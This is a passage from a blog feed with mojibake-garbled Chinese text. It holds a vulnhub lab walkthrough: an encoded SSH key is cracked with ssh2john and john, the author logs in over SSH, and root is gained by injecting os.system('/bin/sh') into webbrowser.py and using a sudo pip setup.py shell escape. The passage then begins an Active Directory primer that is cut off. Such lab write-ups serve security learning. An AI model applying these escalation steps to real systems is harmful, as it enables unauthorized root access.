class="hljs-number">7</span>DkhmCPb<span class="hljs-number">2</span>mQ<span class="hljs-symbol">NoTSuRpnfUG8</span>CWaD<span class="hljs-number">3</span>L<span class="hljs-number">2</span>Q<span class="hljs-number">9</span>UHepvrs<span class="hljs-number">67</span>YGZJWwk<span class="hljs-number">54</span>rmT<span class="hljs-number">6</span>v<span class="hljs-number">1</span>pHHLDR<span class="hljs-number">8</span>gBC<span class="hljs-number">9</span>ZTfdDtzBaZ<span class="hljs-meta">o8</span>sesPQVbuKA<span class="hljs-number">9</span>VE<span class="hljs-attr">Vsgw1</span>xVvRyRZz<span class="hljs-number">8</span>JH<span class="hljs-number">6</span>DEzqrE<span class="hljs-symbol">neoibQUdJxLVNTMXpYXGi68</span>RA<span class="hljs-number">4</span>V<span class="hljs-number">1</span>pa<span class="hljs-number">5</span>yaj<span class="hljs-number">2</span>UQ<span class="hljs-number">6</span>xRpF<span class="hljs-number">6</span>otrWTerjwAL<span class="hljs-symbol">N67</span>preSWWH<span class="hljs-number">4</span>vY<span class="hljs-number">3</span>MBv<span class="hljs-number">9</span>Cu<span class="hljs-number">6358</span>KWe<span class="hljs-attr">VC1</span>YZAXvBRwoZPXtquY<span class="hljs-number">9</span>EiFL<span class="hljs-number">6</span>i<span class="hljs-number">3</span>KXFe<span class="hljs-number">3</span>Y<span class="hljs-number">7</span>W<span class="hljs-number">4</span>Li<span class="hljs-number">7</span>jF<span class="hljs-number">8</span>vFrK<span class="hljs-number">6</span>woYGy<span class="hljs-number">8</span>soJJYEbXQp<span class="hljs-number">2</span><span class="hljs-symbol">NWqaJNcCQX8</span>umkiGf<span class="hljs-symbol">NFNiRoTfQmz29</span>wBZFJPtPJ<span class="hljs-number">98</span>UkQwKJfSW<span class="hljs-number">9</span>XKvDJwduMRWey<span class="hljs-number">2</span>j<span class="hljs-number">61</span>yaH<span class="hljs-number">4</span>ij<span class="hljs-number">5</span>uZQXDs<span class="hljs-number">37</span>F<span class="hljs-symbol">NV7</span>TBj<span class="hljs-number">71</span>GGFGEh<span class="hljs-number">8</span><span class="hljs-attr">vSKP2</span>g<span class="hljs-name">g5</span><span class="hljs-symbol">nLcACbkzF4</span>zjqdikP<span class="hljs-number">3</span>TF<span class="hljs-symbol">NWGnij5</span>az<span class="hljs-number">3</span>Axve<span class="hljs-symbol">N3</span>EUF<span class="hljs-symbol">nuDtfB4</span>ADRt<span class="hljs-number">57</span>UokLMDi<span class="hljs-number">1</span>V<span class="hljs-number">73</span>Pt<span class="hljs-number">5</span>PQe<span class="hljs-number">8</span><span class="hljs-name">g8</span>SLjuvt<span class="hljs-symbol">NYpo8</span>AqyC<span class="hljs-number">3</span>zTMSmP<span class="hljs-number">8</span>dFQgoborCXEMJz<span class="hljs-number">6</span><span class="hljs-symbol">npX6</span>QhgXqpbhS<span class="hljs-number">58</span>yVRhpW<span class="hljs-number">21</span><span class="hljs-symbol">Nz4</span>xFkDL<span class="hljs-number">8</span>QFCVH<span class="hljs-number">2</span>beL<span class="hljs-number">1</span>PZxEghmdVdY<span class="hljs-number">9</span><span class="hljs-symbol">N3</span>pVrMBUS<span class="hljs-number">7</span>Mz<span class="hljs-symbol">nYasCruXqWVE55</span>RPuSPrMEcRLoCa<span class="hljs-number">1</span>XbYt<span class="hljs-name">G5</span>JxqfbE<span class="hljs-name">g2</span>aw<span class="hljs-number">8</span>BdMirLLWhuxb<span class="hljs-name">m3</span>hxrr<span class="hljs-number">9</span>ZizxDDyu<span class="hljs-number">3</span>i<span class="hljs-number">1</span>PLkpHgQw<span class="hljs-number">3</span>zH<span class="hljs-number">4</span>GTK<span class="hljs-number">2</span>mb<span class="hljs-number">5</span>fxuu<span class="hljs-number">9</span>W<span class="hljs-number">6</span><span class="hljs-symbol">nGWW24</span>wjGbxHW<span class="hljs-number">6</span>aT<span class="hljs-symbol">neLweh74</span>jFWKzfSLgEVyc<span class="hljs-number">7</span>RyAS<span class="hljs-number">7</span>Qkwkud<span class="hljs-number">9</span>ozyBxxsV<span class="hljs-number">4</span>VEdf<span class="hljs-number">8</span>mW<span class="hljs-number">5</span><span class="hljs-name">g3</span><span class="hljs-symbol">nTDyKE69</span>P<span class="hljs-number">34</span>SkpQgDV<span class="hljs-symbol">NKJvDfJvZbL8</span><span class="hljs-meta">o6</span>BfPjEPi<span class="hljs-number">125</span>edV<span class="hljs-number">9</span>JbCy<span class="hljs-symbol">NRFKKpTxpq7</span>QSruk<span class="hljs-number">7</span>L<span class="hljs-number">5</span>LEX<span class="hljs-name">G8</span>H<span class="hljs-number">4</span>rsLyv<span class="hljs-number">6</span>djUT<span class="hljs-number">9</span><span class="hljs-symbol">nJGWQKRPi3</span>Bugawd<span class="hljs-number">7</span>ixMUYoRMhagBmGY<span class="hljs-symbol">Nafi4</span>JBapacTMw<span class="hljs-name">G95</span>wPyZT<span class="hljs-number">8</span>Mz<span class="hljs-number">6</span>gALq<span class="hljs-number">5</span>Vmr<span class="hljs-number">8</span>tkk<span class="hljs-number">9</span>ry<span class="hljs-number">4</span>Ph<span class="hljs-number">4</span>U<span class="hljs-number">2</span>Erihv<span class="hljs-symbol">NiFQVS7</span>U<span class="hljs-number">9</span>XBwQHc<span class="hljs-number">6</span>fhrDHz<span class="hljs-number">2</span>objdeDGvuVHzPgqMeRMZtjzaLBZ<span class="hljs-number">2</span>wDLeJUKEjaJAH<span class="hljs-symbol">nFLxs1</span>xWXU<span class="hljs-number">7</span>V<span class="hljs-number">4</span>gigRAtiMFB<span class="hljs-number">5</span>bjFTc<span class="hljs-number">7</span>owzKHcqP<span class="hljs-number">8</span><span class="hljs-symbol">nJrXou8</span>VJqFQDMD<span class="hljs-number">3</span>PJcLjdErZGUS<span class="hljs-number">7</span>oauaa<span class="hljs-number">3</span>xhyx<span class="hljs-number">8</span>Ar<span class="hljs-number">3</span>Aygg<span class="hljs-symbol">nywjjwZ8</span>uoWQbmx<span class="hljs-number">8</span>Sx<span class="hljs-number">71</span>x<span class="hljs-number">4</span><span class="hljs-symbol">NyhHZUzHpi8</span>vkEkbKKk<span class="hljs-number">1</span>rVL<span class="hljs-symbol">NBWHHi75</span>HixzAt<span class="hljs-symbol">NTX6</span>p<span class="hljs-symbol">nEJC3</span>t<span class="hljs-number">7</span>EPkbouDC<span class="hljs-number">2</span>eQd<span class="hljs-number">9</span>i<span class="hljs-number">6</span>K<span class="hljs-number">3</span>C<span class="hljs-symbol">npZHY3</span>mL<span class="hljs-number">7</span>zc<span class="hljs-name">g2</span>PHesRSj<span class="hljs-number">6</span>e<span class="hljs-number">7</span>oZBo<span class="hljs-name">M2</span>pSVTwtXRFBPTyFmUavtitoA<span class="hljs-number">8</span>kFZb<span class="hljs-number">4</span>DhYMcx<span class="hljs-symbol">NyLf7</span>r<span class="hljs-number">8</span>H<span class="hljs-number">98</span>WbtCshaEBaY<span class="hljs-number">7</span>b<span class="hljs-number">5</span>C<span class="hljs-symbol">ntvgFFEucFanfbz6</span>w<span class="hljs-number">8</span>cDyXJ<span class="hljs-symbol">nkzeW1</span>fz<span class="hljs-number">19</span><span class="hljs-symbol">Ni9</span>i<span class="hljs-number">6</span>h<span class="hljs-number">4</span>Bg<span class="hljs-meta">o6</span>BR<span class="hljs-number">8</span>Fkd<span class="hljs-number">5</span>dheH<span class="hljs-number">5</span>TGz<span class="hljs-number">47</span>VFH<span class="hljs-number">6</span>hmY<span class="hljs-number">3</span>aUgUvP<span class="hljs-number">8</span>Ai<span class="hljs-number">2</span>F<span class="hljs-number">2</span>jKFK<span class="hljs-name">g4</span>i<span class="hljs-number">3</span>HfCJHG<span class="hljs-name">g1</span>CXktuqz<span class="hljs-symbol">nVucjWmdZmuACA2</span>gce<span class="hljs-number">2</span>rpiBT<span class="hljs-number">6</span>GxmMrfSxDCiY<span class="hljs-number">32</span>axw<span class="hljs-number">2</span>QP<span class="hljs-number">7</span><span class="hljs-symbol">nzEBvCJi58</span>rVe<span class="hljs-number">8</span>JtdESt<span class="hljs-number">2</span>zHGsUga<span class="hljs-number">2</span>iySmusfpWqjY<span class="hljs-name">m8</span>kfmqTbY<span class="hljs-number">4</span>qAK<span class="hljs-number">13</span>v<span class="hljs-symbol">NMR95</span>QhXV<span class="hljs-number">9</span>VYp<span class="hljs-number">9</span>qff<span class="hljs-name">G5</span>YWY<span class="hljs-number">163</span>WJV<span class="hljs-number">5</span>urYK<span class="hljs-name">M6</span>BBiuK<span class="hljs-number">9</span>QkswCzgPtjsfFBBU<span class="hljs-meta">o6</span>vft<span class="hljs-symbol">NqCNbzQn4</span><span class="hljs-symbol">NMQmxm28</span>hDMDU<span class="hljs-number">8</span>GydwU<span class="hljs-name">m19</span>oj<span class="hljs-symbol">No1</span>scUMzGf<span class="hljs-symbol">N4</span>rLx<span class="hljs-number">7</span>bs<span class="hljs-number">3</span>S<span class="hljs-number">9</span>wYaVLDLi<span class="hljs-symbol">NeZdLLU1</span>DaKQhZ<span class="hljs-number">5</span>cFZ<span class="hljs-number">7</span>iymJHXuZFFgpbYZYFigLa<span class="hljs-number">7</span>SokXis<span class="hljs-number">1</span>LYfbHeXM<span class="hljs-attr">vcfeuApmAaGQk6</span>xmajEbpcb<span class="hljs-symbol">n1</span>H<span class="hljs-number">5</span>QQiQpYMX<span class="hljs-number">3</span>BRp<span class="hljs-number">41</span>w<span class="hljs-number">9</span>RVRuLGZ<span class="hljs-number">1</span>yLKxP<span class="hljs-number">37</span>ogcppStCvDMGfiuVMU<span class="hljs-number">5</span>SRJMajLXJBz<span class="hljs-symbol">nzRSqBYwWmf4</span>MS<span class="hljs-number">6</span>B<span class="hljs-number">57</span>xp<span class="hljs-number">56</span>jVk<span class="hljs-number">6</span>maGCsgjbuAhLyCwfG<span class="hljs-symbol">n1</span>LwLoJDQ<span class="hljs-number">1</span>kjLm<span class="hljs-symbol">nVrk7</span>FkUUESqJKjp<span class="hljs-number">5</span>cuX<span class="hljs-number">1</span>EUpFjsfU<span class="hljs-number">1</span>HaibABz<span class="hljs-number">3</span>fcYY<span class="hljs-number">2</span>cZ<span class="hljs-number">78</span>qx<span class="hljs-number">2</span>iaqS<span class="hljs-number">7</span>eP<span class="hljs-meta">o5</span>Bkwv<span class="hljs-number">5</span>XmtcLELXbQZKcHcwxkbC<span class="hljs-number">5</span>P<span class="hljs-symbol">nEP6</span>EUZRb<span class="hljs-number">3</span><span class="hljs-symbol">nqm5</span>hMDUUt<span class="hljs-number">912</span>ha<span class="hljs-number">5</span>kMR<span class="hljs-number">6</span><span class="hljs-name">g4</span>aV<span class="hljs-name">G8</span>bXFU<span class="hljs-number">6</span>a<span class="hljs-symbol">n5</span>PikaedHBRVRCygkpQj<span class="hljs-name">m8</span>Lhe<span class="hljs-number">1</span>cA<span class="hljs-number">8</span>X<span class="hljs-number">2</span>jtQiUjwveF<span class="hljs-number">5</span>bU<span class="hljs-symbol">NPmvPGk1</span>hjuP<span class="hljs-number">56</span>aWEg<span class="hljs-symbol">nyXzZkKVPbWj7</span>MQQ<span class="hljs-number">3</span>kAfqZ<span class="hljs-number">8</span>hkKD<span class="hljs-number">1</span>VgQ<span class="hljs-number">8</span>pmqayiajhFHorfgtRk<span class="hljs-number">8</span>ZpuEPpHH<span class="hljs-number">25</span>aoJf<span class="hljs-symbol">NMtY45</span>mJYjHM<span class="hljs-attr">VSVnvG9</span>e<span class="hljs-number">3</span>PHrGwrks<span class="hljs-number">1</span>eLQRXjjRmGtWu<span class="hljs-number">9</span>cwT<span class="hljs-number">2</span>bjy<span class="hljs-number">2</span>huWY<span class="hljs-number">5</span>b<span class="hljs-number">7</span>xUSAXZfmRsbkT<span class="hljs-number">3</span>eFQ<span class="hljs-symbol">nGkAHmjMZ5</span><span class="hljs-symbol">nAfmeGhshCtNjAU4</span>idu<span class="hljs-number">8</span><span class="hljs-meta">o7</span>HMmMuc<span class="hljs-number">3</span>tpK<span class="hljs-number">6</span>res<span class="hljs-number">9</span>HTC<span class="hljs-meta">o35</span>ujK<span class="hljs-number">3</span>UK<span class="hljs-number">2</span>LyMFEKjB<span class="hljs-symbol">NcXbigDWSM34</span>mXSKHA<span class="hljs-number">1</span><span class="hljs-name">M4</span>MF<span class="hljs-number">7</span>dPewvQsAkvxRTCmeWwRWz<span class="hljs-number">6</span>DKZv<span class="hljs-number">2</span>MY<span class="hljs-number">1</span>ezWd<span class="hljs-number">7</span>mLvwG<span class="hljs-meta">o9</span>ti<span class="hljs-number">9</span>SMTXrkrxHQ<span class="hljs-number">8</span>DShu<span class="hljs-symbol">NorjCzNCuxLNG9</span>ThpPgWJoFb<span class="hljs-number">1</span>sJL<span class="hljs-number">1</span>ic<span class="hljs-number">9</span>QVTvDHCJ<span class="hljs-symbol">nD1</span>AKdCjt<span class="hljs-symbol">NHrG973</span>BVZ<span class="hljs-symbol">NUF6</span>DwbFq<span class="hljs-number">5</span>d<span class="hljs-number">4</span>CTL<span class="hljs-symbol">N6</span>jxtCFs<span class="hljs-number">3</span>XmoKquzEY<span class="hljs-number">7</span>MiCzRaq<span class="hljs-number">3</span>kB<span class="hljs-symbol">NAFYNCoVxRBU3</span>d<span class="hljs-number">3</span>aXfLX<span class="hljs-number">4</span>rZXEDBfAgtumkRRmWowk<span class="hljs-symbol">Njs2</span>JDZmzS<span class="hljs-number">4</span>H<span class="hljs-number">8</span><span class="hljs-symbol">nawmMa1</span>PYmrr<span class="hljs-number">7</span>a<span class="hljs-symbol">NDPEW2</span>wdbjZurKAZhheoEYCvP<span class="hljs-number">9</span>dfqdbL<span class="hljs-number">9</span>gPrWf<span class="hljs-symbol">NBJyVBXRD8</span>EZwFZ<span class="hljs-symbol">NKb1</span>eWPh<span class="hljs-number">1</span>sYzUbPPhgruxWA<span class="hljs-symbol">NCH52</span>gQpfAT<span class="hljs-symbol">NqmtTJZFjsfpiXLQjdBxdzfz7</span>pWvK<span class="hljs-number">8</span>jivh<span class="hljs-symbol">nQaiajW3</span>pwt<span class="hljs-number">4</span>cZxwMfcrrJke<span class="hljs-number">14</span>v<span class="hljs-symbol">N8</span>Xbyqdr<span class="hljs-number">9</span>zLFjZDJ<span class="hljs-number">7</span><span class="hljs-symbol">nLdmuXTwxPwD8</span>Seoq<span class="hljs-number">2</span>hYEhR<span class="hljs-number">97</span>D<span class="hljs-symbol">nKfMY2</span>LhoWGaHoFqycPCaX<span class="hljs-number">5</span>FCP<span class="hljs-symbol">Nf9</span>CFt<span class="hljs-number">4</span><span class="hljs-symbol">n4</span><span class="hljs-symbol">nYGLau7</span>ci<span class="hljs-number">5</span>uC<span class="hljs-number">7</span>ZmssiT<span class="hljs-number">1</span>jHTjKy<span class="hljs-number">7</span>J<span class="hljs-number">9</span>a<span class="hljs-number">4</span>q<span class="hljs-number">614</span>GFDdZULTkw<span class="hljs-number">8</span>Pmh<span class="hljs-number">92</span>fuTdK<span class="hljs-number">7</span>Z<span class="hljs-number">6</span>fweY<span class="hljs-number">4</span>hZyGdUXGtPXveXwGWES<span class="hljs-number">36</span>ecCpYXPSPw<span class="hljs-number">6</span>ptVb<span class="hljs-number">9</span>RxC<span class="hljs-number">81</span>AZFPG<span class="hljs-symbol">nts85</span>PYS<span class="hljs-number">6</span>aD<span class="hljs-number">2</span>eUmge<span class="hljs-number">6</span>KGzFopMjYLma<span class="hljs-number">85</span>X<span class="hljs-number">55</span>Pu<span class="hljs-number">4</span>tCxyF<span class="hljs-number">2</span>FR<span class="hljs-number">9</span>E<span class="hljs-number">3</span>c<span class="hljs-number">2</span>zxtry<span class="hljs-name">G6</span><span class="hljs-symbol">N2</span>oVT<span class="hljs-symbol">nyZt23</span>YrEhEe<span class="hljs-number">9</span>kcCX<span class="hljs-number">59</span>RdhrDr<span class="hljs-number">71</span>Z<span class="hljs-number">3</span>zgQkAs<span class="hljs-number">8</span>uPM<span class="hljs-name">M1</span>JPvM<span class="hljs-symbol">NgdyNzpgEGGgj9</span>czgBa<span class="hljs-symbol">N5</span>PWrpPBWft<span class="hljs-name">g9</span>fte<span class="hljs-number">4</span>xYyvJ<span class="hljs-number">1</span>BF<span class="hljs-symbol">N5</span>WDvTYfhUtc<span class="hljs-symbol">n1</span>oRTDow<span class="hljs-number">67</span>w<span class="hljs-number">5</span>zz<span class="hljs-number">3</span>adjLD<span class="hljs-symbol">nXLQc6</span>MaowZJ<span class="hljs-number">2</span>zyh<span class="hljs-number">4</span>PAc<span class="hljs-number">1</span>vpstCRtKQt<span class="hljs-number">35</span>JEdwfwUe<span class="hljs-number">4</span>wz<span class="hljs-symbol">Nr3</span>sidChW<span class="hljs-number">8</span>VuMU<span class="hljs-number">1</span>Lz<span class="hljs-number">1</span>cAj<span class="hljs-attr">vcVHEp1</span>Sab<span class="hljs-meta">o8</span>FprJwJgRs<span class="hljs-number">5</span>ZPA<span class="hljs-number">7</span>Ve<span class="hljs-number">6</span>LDW<span class="hljs-number">7</span>hFa<span class="hljs-symbol">ngK8</span>YwZmRCmXxArBFVwjfV<span class="hljs-number">2</span>SjyhTjhdqswJE<span class="hljs-number">5</span><span class="hljs-symbol">nP6</span>pV<span class="hljs-symbol">nshbV8</span>Zq<span class="hljs-name">G2</span>L<span class="hljs-number">8</span>d<span class="hljs-number">1</span>cwhxpxggmu<span class="hljs-number">1</span>jByELxVHF<span class="hljs-number">1</span>C<span class="hljs-number">9</span>T<span class="hljs-number">3</span>GgLDvgUv<span class="hljs-number">8</span><span class="hljs-symbol">nc7</span>PEJYoXpCoyCs<span class="hljs-number">55</span>r<span class="hljs-number">35</span>h<span class="hljs-number">9</span>YzfKgjcJkvFTdfPHwW<span class="hljs-number">8</span>fSjCVBuUTKSEAvkRr<span class="hljs-number">6</span>iLj<span class="hljs-number">6</span>H<span class="hljs-number">4</span>LEjB<span class="hljs-name">g256</span><span class="hljs-name">G4</span>DHHqpwTgYFtejc<span class="hljs-number">8</span><span class="hljs-symbol">nLX77</span>LUoVmACLvfC<span class="hljs-number">439</span>jtVdxCtYA<span class="hljs-number">6</span>y<span class="hljs-number">2</span>vj<span class="hljs-number">7</span>ZDeX<span class="hljs-number">7</span>zp<span class="hljs-number">2</span>VYR<span class="hljs-number">89</span>GmSqEWj<span class="hljs-number">3</span>doqdahv<span class="hljs-number">1</span>DktvtQcRBiizMg<span class="hljs-symbol">NWYsjMWRM4</span>BPSc<span class="hljs-symbol">nn92</span><span class="hljs-symbol">ncLD1</span>Bw<span class="hljs-number">5</span>ioB<span class="hljs-number">8</span><span class="hljs-symbol">NyZ9</span>C<span class="hljs-symbol">NkMNk4</span>Pf<span class="hljs-number">7</span>Uqa<span class="hljs-number">7</span><span class="hljs-attr">vCTgw4</span>VJv<span class="hljs-attr">vSjE6</span>PRF<span class="hljs-symbol">nqDSrg4</span>avGUqeMUm<span class="hljs-symbol">ngc5</span>m<span class="hljs-symbol">N6</span>WEa<span class="hljs-number">3</span>pxHpkh<span class="hljs-name">G8</span>Z<span class="hljs-symbol">ngCqKvVhegBAVi7</span><span class="hljs-symbol">nDBTwukqEDeCS46</span>UczhXMFbAg<span class="hljs-symbol">nQWhExas547</span><span class="hljs-attr">vCXho71</span>gcmVqu<span class="hljs-number">2</span>x<span class="hljs-number">5</span>EAPFgJqyvMmRScQxiKrYoK<span class="hljs-number">3</span>p<span class="hljs-number">279</span>KLAyS<span class="hljs-name">M4</span>v<span class="hljs-symbol">NcRxrRrR2</span>DYQwhe<span class="hljs-number">8</span>Yj<span class="hljs-symbol">Nsf8</span>MzqjX<span class="hljs-number">54</span>mhbWcjz<span class="hljs-number">3</span>jeXoko<span class="hljs-symbol">nVk77</span>P<span class="hljs-number">9</span><span class="hljs-name">g9</span>y<span class="hljs-number">69</span>DVzJeYUvfX<span class="hljs-attr">VCjPWi7</span>aDDA<span class="hljs-number">7</span>HdQd<span class="hljs-number">2</span>UpCghEGtWSfEJtDgPxurPq<span class="hljs-number">8</span>qJQh<span class="hljs-number">3</span><span class="hljs-symbol">N75</span>YF<span class="hljs-number">8</span>KeQzJs<span class="hljs-number">77</span>Tpwcdv<span class="hljs-number">2</span>Wuvi<span class="hljs-number">1</span>L<span class="hljs-number">5</span>ZZtppbWymsgZckW<span class="hljs-symbol">nkg5</span><span class="hljs-symbol">NB9</span>Pp<span class="hljs-number">5</span>izVXCiFhobqF<span class="hljs-number">2</span>vd<span class="hljs-number">2</span>jh<span class="hljs-name">g4</span>rcpLZ<span class="hljs-symbol">nGdmmEotL7</span>CfRdVwUWpVppHRZzq<span class="hljs-number">7</span>FEQQFxkRL<span class="hljs-number">7</span>JzGoL<span class="hljs-number">8</span>R<span class="hljs-number">8</span>wQ<span class="hljs-name">G1</span>UyB<span class="hljs-symbol">NKPBbVnc7</span>jGyJqFuj<span class="hljs-attr">vCLt6</span>yMUEYXKQTipmEhx<span class="hljs-number">4</span>rXJZK<span class="hljs-number">3</span>aKdbucKhGqMYMH<span class="hljs-symbol">nVbtpLrQUaPZHsiNGUcEd64</span>KW<span class="hljs-number">5</span>kZ<span class="hljs-number">7</span>svohTC<span class="hljs-number">5</span>i<span class="hljs-number">4</span>L<span class="hljs-number">4</span>TuEzRZEyWy<span class="hljs-number">6</span>v<span class="hljs-number">2</span>GGiEp<span class="hljs-number">4</span>Mf<span class="hljs-number">2</span>oEHMUwqto<span class="hljs-symbol">NXbsGp8</span>sbJbZATFLXVbP<span class="hljs-number">3</span>PgBw<span class="hljs-number">8</span>rgAakz<span class="hljs-number">7</span>QBFAGryQ<span class="hljs-number">3</span>t<span class="hljs-symbol">nxytWNuHWkPohMMKUiDFeRyLi8</span>HGUdocwZFzdkbffv<span class="hljs-meta">o8</span>HaewPYF<span class="hljs-symbol">NsPDCn1</span>PwgS<span class="hljs-number">8</span>wA<span class="hljs-number">9</span>agCX<span class="hljs-number">5</span>kZbKWBmU<span class="hljs-number">2</span>zpCstqFAxXeQd<span class="hljs-number">8</span>LiwZzPdsbF<span class="hljs-number">2</span>YZEKz<span class="hljs-symbol">NYtckW5</span>RrFa<span class="hljs-number">5</span>zDgK<span class="hljs-name">m2</span>gSR<span class="hljs-symbol">N8</span>gHz<span class="hljs-number">3</span>WqS<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021820055.png" alt="image-20250102182015981"></p><p>å¾—åˆ°äº†ç§é’¥ï¼Œæˆ‘ä»¬å¯ä»¥å»sshç™»å½•ä¸€ä¸‹ã€‚</p><p>å°†ç§é’¥æ”¾åœ¨ä¸€ä¸ªpasswd.txtæ–‡ä»¶é‡Œé¢ ç„¶ååˆ©ç”¨ssh2johnè½¬æ¢æˆjohnå¯ä»¥çˆ†ç ´çš„å½¢å¼ ç„¶åè¿›è¡Œçˆ†ç ´å¯†ç å³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021826091.png" alt="image-20250102182612790"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021827912.png" alt="image-20250102182747797"></p><p>å¯ä»¥å¾—åˆ°å¯†ç ï¼šP@55w0rd!</p><p>ç„¶åå°±æ˜¯sshè¿œç¨‹ç™»å½•è¿›å»ã€‚</p><p>æ³¨æ„éœ€è¦ä¿®æ”¹ç§é’¥æ–‡ä»¶çš„æƒé™ ä¿®æ”¹ä¸º600</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021833688.png" alt="image-20250102183341578"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨homeç›®å½•ä¸‹ å­˜åœ¨ä¸¤ä¸ªç”¨æˆ· åˆ†åˆ«æ˜¯ icex64å’Œarsene</p><p>sudo -l çœ‹äº†ä¸€ä¸‹ èƒ½å‘ç°ä¸€ä¸ªpythonæ–‡ä»¶ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021838353.png" alt="image-20250102183829265"></p><p>çœ‹ä¸€ä¸‹å†…å®¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021839050.png" alt="image-20250102183914003"></p><p>å¯¼å…¥äº†webbrowserè¿™ä¸ªï¼Œç„¶åæˆ‘ä»¬åˆ©ç”¨findæŸ¥æ‰¾ä¸€ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> /usr -name <span class="hljs-string">&#x27;*webbrowser*&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021851219.png" alt="image-20250102185103150"></p><p>æŸ¥çœ‹ä¸€ä¸‹webbrowser.pyæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021853728.png" alt="image-20250102185302631"></p><p>å¯¼å…¥äº†æŒºå¤šæ¨¡å—çš„ï¼Œç„¶åæˆ‘ä»¬åœ¨é‡Œé¢æ·»åŠ ä¸€ä¸ªos.sysytem(â€œ/bin/shâ€)</p><p>ä½¿ç”¨viè¿›è¡Œæ–‡ä»¶çš„ç¼–è¯‘</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021859874.png" alt="image-20250102185923696"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021901086.png" alt="image-20250102190138000"></p><p>sudo -l çœ‹ä¸€ä¸‹ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021902019.png" alt="image-20250102190159973"></p><p>å‘ç°å¯ä»¥è¿›è¡Œpipææƒ</p><p>åœ¨è¿™ä¸ªç½‘ç«™ä¸Šå¯ä»¥çœ‹åˆ°ææƒçš„ä¿¡æ¯</p><p><a href="https://gtfobins.github.io/gtfobins/pip/#sudo">https://gtfobins.github.io/gtfobins/pip/#sudo</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><p>ææƒæˆåŠŸ.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021902751.png" alt="image-20250102190256596"></p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸŸæ¸—é€åŸºç¡€çŸ¥è¯†</title>
    <link href="/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Active-Directory-åŸºç¡€çŸ¥è¯†"><a href="#Active-Directory-åŸºç¡€çŸ¥è¯†" class="headerlink" title="Active Directory åŸºç¡€çŸ¥è¯†"></a>Active Directory åŸºç¡€çŸ¥è¯†</h1><h2 id="WindowsåŸŸ"><a href="#WindowsåŸŸ" class="headerlink" title="WindowsåŸŸ"></a>WindowsåŸŸ</h2><p>å½“ä¸€ä¸ªåŒºåŸŸæœ‰å¤šå°è®¡ç®—æœºï¼Œéš¾ä»¥é€ä¸ªç®¡ç†æ—¶ï¼Œé€šå¸¸ä¼šå°†è¿™äº›è®¡ç®—æœºçš„é€šç”¨ç»„ä»¶çš„ç®¡ç†é›†ä¸­åœ¨ä¸€ä¸ªè¢«ç§°ä¸º<strong>Active Directory</strong>(AD)çš„å­˜å‚¨åº“ä¸­,è¿è¡ŒADçš„æœåŠ¡å™¨è¢«ç§°ä¸ºDC(åŸŸæ§åˆ¶å™¨)</p><p>ç®¡ç†å‘˜é€šè¿‡æ§åˆ¶ADä»è€Œæ§åˆ¶å…¶ä»–è®¡ç®—æœºï¼Œå¹¶åœ¨ADä¸­é…ç½®ç­–ç•¥åº”ç”¨åˆ°ç½‘ç»œä¸­ã€‚</p><h2 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h2><p>ADä¸­åŒ…å«å¾ˆå¤šå¯¹è±¡ï¼ŒåŒ…æ‹¬ç”¨æˆ·ï¼Œæœºå™¨ï¼Œå®‰å…¨ç»„ï¼Œæ‰“å°æœºç­‰ã€‚</p><p>åŸŸä¸­æ¯”è¾ƒé‡è¦çš„å®‰å…¨ç»„ï¼š</p><table><thead><tr><th><strong>å®‰å…¨ç»„</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>Domain Admins</td><td>è¯¥ç»„çš„ç”¨æˆ·æ‹¥æœ‰æ•´ä¸ªåŸŸçš„ç®¡ç†æƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯ä»¥ç®¡ç†åŸŸä¸­çš„ä»»ä½•è®¡ç®—æœºï¼ŒåŒ…æ‹¬ DCã€‚</td></tr><tr><td>Server Operators</td><td>æ­¤ç»„ä¸­çš„ç”¨æˆ·å¯ä»¥ç®¡ç†åŸŸæ§åˆ¶å™¨ã€‚ä»–ä»¬æ— 